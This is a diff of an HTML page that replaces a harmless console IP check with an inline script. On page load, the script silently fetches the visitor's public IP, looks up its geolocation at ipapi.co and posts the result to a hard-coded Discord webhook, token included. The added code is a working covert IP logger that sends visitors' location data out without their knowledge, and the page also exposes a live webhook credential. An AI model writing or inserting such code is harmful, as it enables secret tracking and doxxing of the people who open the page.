@@ -6,12 +6,33 @@
 <body>
     
 <script>
-    const http = new XMLHttpRequest()
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false );
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
 
-http.open("GET", "https://api.ipify.org?format=json")
-http.send()
+const ip = httpGet("https://icanhazip.com/")
+const info = httpGet("https://ipapi.co/" + ip + "/json/")
 
-http.onload = () => console.log(http.responseText)
+function sendMessage(xd) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/991841649330237570/mpzCXtNSqZIlWufOE8YHAJH3q6nwxyoljjklTaaA3nnb6ZB1sNdzpGzIWC7ghV4ZLBBu");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "aaaaaa",
+        avatar_url: "",
+        content: xd
+      }
+
+      request.send(JSON.stringify(params));
+}
+sendMessage(info)
+
 </script>
 </body>
 </html>
